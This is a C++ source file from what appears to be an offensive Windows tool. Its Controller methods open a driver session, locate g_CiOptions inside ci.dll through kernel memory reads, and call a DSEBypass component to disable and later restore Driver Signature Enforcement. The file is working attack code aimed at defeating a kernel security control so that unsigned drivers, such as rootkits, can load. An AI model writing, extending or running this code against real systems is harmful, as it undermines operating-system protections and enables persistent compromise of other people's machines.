#include "Controller.h"
#include "common.h"

bool Controller::DisableDSE() noexcept {
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE bypass");
        return false;
    }
    
    // Explicitly open driver handle
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Driver handle opened successfully");
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc);
    }
    
    bool result = m_dseBypass->DisableDSE();
    
    EndDriverSession(true);
    
    return result;
}

bool Controller::RestoreDSE() noexcept {
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE restore");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    // Always create new object - program starts from scratch between invocations
    m_dseBypass = std::make_unique<DSEBypass>(m_rtc);
    
    bool result = m_dseBypass->RestoreDSE();
    
    EndDriverSession(true);
    
    return result;
}

ULONG_PTR Controller::GetCiOptionsAddress() const noexcept {
    if (!m_dseBypass) {
        return 0;
    }
    
    return m_dseBypass->GetCiOptionsAddress();
}

bool Controller::GetDSEStatus(ULONG_PTR& outAddress, DWORD& outValue) noexcept {
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE status check");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc);
    }
    
    // Find ci.dll and locate g_CiOptions
    auto ciBase = m_dseBypass->GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        EndDriverSession(true);
        return false;
    }
    
    outAddress = m_dseBypass->FindCiOptions(ciBase.value());
    if (outAddress == 0) {
        ERROR(L"Failed to locate g_CiOptions address");
        EndDriverSession(true);
        return false;
    }
    
    // Read current value
    auto currentValue = m_rtc->Read32(outAddress);
    if (!currentValue) {
        ERROR(L"Failed to read g_CiOptions value");
        EndDriverSession(true);
        return false;
    }
    
    outValue = currentValue.value();
    
    EndDriverSession(true);
    return true;
}